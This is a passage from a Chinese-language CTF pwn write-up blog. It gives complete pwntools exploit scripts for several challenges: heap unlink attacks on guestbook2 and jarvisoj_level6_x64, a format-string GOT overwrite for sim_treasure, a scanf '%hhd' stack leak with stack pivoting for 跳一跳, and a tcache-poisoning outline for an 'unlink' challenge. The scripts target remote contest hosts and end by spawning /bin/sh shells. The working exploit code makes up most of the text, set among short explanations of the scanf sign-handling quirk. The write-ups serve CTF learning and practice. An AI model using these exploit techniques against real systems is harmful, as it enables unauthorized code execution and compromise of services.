class="line">p.recvuntil(<span class="string">b&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">leak_libc=u64_recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(p,d_a,d_s,d_e,d_d)</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)    </span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011921609.png" alt="image-20230701192132338"></p>
<h2 id="jarvisoj-level6-x64的exp"><a href="#jarvisoj-level6-x64的exp" class="headerlink" title="jarvisoj_level6_x64的exp"></a>jarvisoj_level6_x64的exp</h2><p>这道题和guestbook2这道题一模一样(除了交互)</p>
<p>直接贴下exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28822</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;t&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tttttttt&#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#heap_addr=u64(p.recv(3).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#u64_recv_libc()</span></span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#+libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span><span class="comment">#0x18f8</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line"><span class="comment">#debug(p,d_d,d_s,d_a,d_e,0x4008A6)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011921866.png" alt="image-20230701192146652"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>iscc_pwn_部分wp</title>
    <url>/posts/fcb54cab.html</url>
    <content><![CDATA[<p>由于本人比较菜，同时学pwn的时间不是太久，因此iscc的很多堆还没有能力去做，只把比赛的栈题给做完了 赛后又做了一下unlink那道题。其他堆题目前还没有复现。（有一个格式化字符串太简单了，我就不写wp了）</p>
<span id="more"></span>

<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><img src="https://s2.loli.net/2022/06/06/sDIeyH3LEjxJrvO.png" alt="image-20220502161408233" style="zoom: 33%;" />

<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>程序无限次执行格式化字符串漏洞，思路为泄露出函数的真实地址，然后利用libc库里的偏移得到libc基地址，然后加上system函数在libc库中的偏移，用printf把自己的got表改成system函数，然后输入参数&#x2F;bin&#x2F;sh即可获取shell。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7010</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload=<span class="string">&#x27;%8$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_got_addr=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got_addr)+<span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc=printf_addr-<span class="number">0x512d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>,libc)</span><br><span class="line">hook=leak-<span class="number">0x88</span></span><br><span class="line">ret_addr=<span class="number">0x080483da</span></span><br><span class="line">ret_hook=ret_addr&amp;<span class="number">0xffff</span></span><br><span class="line">bin_sh=<span class="number">0x0017e1db</span>+libc</span><br><span class="line">system=<span class="number">0x0003d200</span>+libc</span><br><span class="line"></span><br><span class="line">low_offset=system&amp;<span class="number">0xffff</span></span><br><span class="line">high_offset=(system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hook-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(low_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(high_offset))</span><br><span class="line">payload=p32(printf_got_addr)+p32(printf_got_addr+<span class="number">2</span>)+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_offset-<span class="number">8</span>)+<span class="string">&#x27;c%6$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_offset-low_offset)+<span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a>跳一跳</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>1、scanf函数的参数为%hhd时，可以输入<code>-</code>在不覆盖栈中数据的情况下，占据一个字节，配合%s可以泄露栈中任何一个内容。</p>
<p>2、根据以往的经验感觉没有什么核心利用点的时候，尽量把注意力都集中到新遇到的知识上，这道题我有想过找一些字符去实现在不覆盖栈中数据的情况下，但是没有找到合适的字符，从而放弃了这个思路，甚至尝试用爆破的方式来劫持执行流（不过最后失败了）。</p>
<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://s2.loli.net/2022/06/06/X9vWBjzGlYh8aMD.png" alt="image-20220502150019723" style="zoom: 50%;" />

<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="https://s2.loli.net/2022/06/06/NKZ3UjEhoayqJpv.png" alt="image-20220502100753717" style="zoom:50%;" />

<p>这道题的关键点就一个，当scanf用%hhd的时候，<code>-</code>这个东西可以不覆盖栈中数据的情况下在栈中占一位，说的有点抽象，代码和效果如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x58</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007200957664.png" alt="image-20221007200957664"></p>
<p>由上图可以发现存在-的地方没有被填入的垃圾数据所覆盖（0x7f4d1e038680依然存在）</p>
<p>原理如下：</p>
<blockquote>
<p>scanf函数在格式化字符类型和输入字符类型不匹配的时候，不会把输入的字符写到栈上，也不会报错，而是继续运行</p>
<p>scanf(“%hhd”,a)</p>
<p>当输入的字符为数字时，才可以被写入栈中，如果是字母则会被定义为非法字符，则会停留在缓冲区导致后面即使出现数字也仅仅是停留到了缓冲区（因为a在缓冲区进不去，后面的数据也都进不去）</p>
<p>通过阅读scanf函数的源码发现（%d的情况），输入的数据是先到了缓冲区中，然后对输入的数据进行检查，如果是+或-或是数字则会把这个数据从缓冲区中接收，否则不接收（例如字母）。继续阅读scanf的源码发现检测到+和-时，指针向后移动了一位（并不读取+或-到栈上），并且此时程序会认为这个符号仅仅是来表示正负的，然后将继续从缓冲区中读取数据，直到遇到\n。</p>
<p>这样就造成了最开始说的bug，+和-通过了检查从缓冲区里被提取了出来，但是它让指针往后挪了一位，并没有被写入到内存里，从而达到了占位的目的。</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/06/06/V1Dv7kiP5Hrg6J2.png" alt="image-20220511141855121"></p>
<p>如果是正号或者负号 则可以触发char_buffer_add</p>
<p>下面是对符号检查部分的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check for a sign.  */</span></span><br><span class="line">  negative = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      negative = <span class="number">1</span>;</span><br><span class="line">      ++s;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    ++s;</span><br></pre></td></tr></table></figure>

<p>（本人只是一位大一的初学者，第一次进行scanf的源码调试（关于搭建源码调试环境的文章在这里  <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a>)，如果上述有理解错误的地方，还请各位师傅斧正）</p>
<p>这个地方是可以简单验证一下，看看是否输入字符会把后面的数字卡在缓冲区。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf [<span class="number">256</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>,buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">	getchar();</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果只输入数字的话，getchar会把回车给读取，然后触发gets就可以再输入一次，效果如下：</p>
<img src="https://s2.loli.net/2022/06/06/rH6GL4RznAvxZ2p.png" alt="image-20220502203014478" style="zoom:50%;" />

<p>如果先输入数字，再输入字符，再输入数字的话，则不会触发gets(因为字符和原本的回车都留在了缓冲区里，getchar并没有读取这个回车，导致了gets执行的时候碰到了回车，gets直接失效)，效果如下：</p>
<img src="https://s2.loli.net/2022/06/06/EmzlMS8rC19cFRo.png" alt="image-20220502203303941" style="zoom:50%;" />



<p>知道了这个原理，这道题基本就乱打了。先看一下栈里能利用的内容</p>
<p><img src="https://s2.loli.net/2022/06/06/GZfTclSq91zwWVY.png" alt="image-20220502150925505"></p>
<p>发现里面有_start函数的地址，那用这个可以拿到程序基地址。还有个_setbuffer函数的地址，可以用它来匹配libc库，然后再泄露个栈地址，用于之后的栈迁移，最后就是把canary给泄露出来，用于最后的劫持执行流</p>
<h3 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h3><p>我最开始泄露的是IO_2_1_stderr的地址，但是这样做的后果就是搜到了将近两百个版本的libc库，因此泄露setbuffer函数的真实地址。</p>
<p>泄露的思路提前计算好要泄露的位置，然后将这些位置布置成<code>-</code> 其他位置则填充成垃圾数据，如果是六字节的栈地址，则只填充六字节的<code>-</code>，另外两字节补成垃圾数据，避免让00截断%s。</p>
<p>得到泄露的内容之后就是一个简单的栈迁移，提前布置system函数以及参数在栈中，改写rbp，最后用leave;ret指令完成迁移获取shell。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_long_libc</span>(<span class="params">target_vul,leak_addr</span>):</span><br><span class="line">    obj = LibcSearcher(target_vul, leak_addr)</span><br><span class="line">    libc_base = leak_addr - obj.dump(target_vul)</span><br><span class="line">    sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr, bin_sh_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_local_libc</span>(<span class="params">target_vul,leak_addr,libc</span>):</span><br><span class="line">    libc_base = leak_addr - libc.symbols[target_vul]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr,bin_sh_addr</span><br><span class="line"><span class="comment">#p=remote(&#x27;123.57.69.203&#x27;,7020)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello CTFer! Welcome to the world of pwn~\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa8</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak libc_base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak canary&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">setbuffer_addr=u64(a[<span class="number">0xb7</span>:<span class="number">0xbd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuffer_addr--------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(setbuffer_addr))</span><br><span class="line">base=u64(a[<span class="number">0xd7</span>:<span class="number">0xdd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base-------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">leak_stack=u64(a[<span class="number">0xdf</span>:<span class="number">0xe5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">canary=u64(a[<span class="number">0xe8</span>:<span class="number">0xef</span>].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#result=autofill_long_libc(&#x27;setbuffer&#x27;,setbuffer_addr)</span></span><br><span class="line">result=autofill_local_libc(<span class="string">&#x27;setbuffer&#x27;</span>,setbuffer_addr,libc)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">pop_rdi_addr=base+<span class="number">0x130b</span></span><br><span class="line">leave_addr=base+<span class="number">0x124a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(canary)+p64(leak_stack-<span class="number">0x1d0</span>-<span class="number">8</span>)+p64(leave_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://s2.loli.net/2022/06/06/na2BjIT164gkDYh.png" alt="image-20220531215015771"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><img src="https://s2.loli.net/2022/06/06/x42Uh5sgZFwN9lt.png" alt="image-20220531215332239" style="zoom: 50%;" />

<p>存在堆溢出，虽然题目是叫做unlink，但是我试了一下，似乎unlink做不出来（可能是我太菜了）。即使patchup成2.23的，等unlink之后，ptr&#x3D;&amp;ptr-0x18，再往fake_chunk写入数据，数据会覆盖掉stdin指针。导致程序无法再输入了。因此用unlink的方法就卡住了。</p>
<p>不过这道题是2.27的，因此可以利用溢出打tcache attack。</p>
<h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><p>先申请两个chunk，低地址的chunk作为溢出堆块。然后释放掉高地址的chunk，利用溢出修改tcachebin中chunk的fd指针（<strong>这个fd指针修改成哪，接下来申请的chunk的地址就在哪。不过由于从tcachebin中申请chunk时，会将其的bk指针的位置赋值成0，如果fd修改成了一个不可写的地址，程序在这里就会崩溃掉）</strong></p>
<p>我们fd指针修改为cmd的地址</p>
<p><img src="https://s2.loli.net/2022/06/06/Mz1N8jpf2ZbKUrB.png" alt="image-20220531231430009"></p>
<p>它位于bss段，是可写的。因此我们可以将它申请到bss段上，再往这个chunk里写入数据时，就修改了bss段上存储的chunk地址，将chunk地址改为free函数的got表，再对这个chunk进行修改，即可修改free的got表。</p>
<p>同时要考虑到修改完got表后，下一次输入的数据依旧再往got表里输入，这就意味着我们无法先修改free的真实地址为system，再传入&#x2F;bin&#x2F;sh**（因为下回传&#x2F;bin&#x2F;sh的时候，free的真实地址又被改成了&#x2F;bin&#x2F;sh）<u>因此需要传参和修改got表同时进行</u>**。这道题因为got表中的free和strncmp是挨着的，所以我们可以劫持free的got表，往里面写入&#x2F;bin&#x2F;sh\x00和system的plt地址，此时字符串的开头则为&#x2F;bin&#x2F;sh\x00（也就是之后strncmp的第一个参数）。同时也将system的plt地址写入到了strncmp中，等到执行strncmp的时候，成功获取shell。</p>
<p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
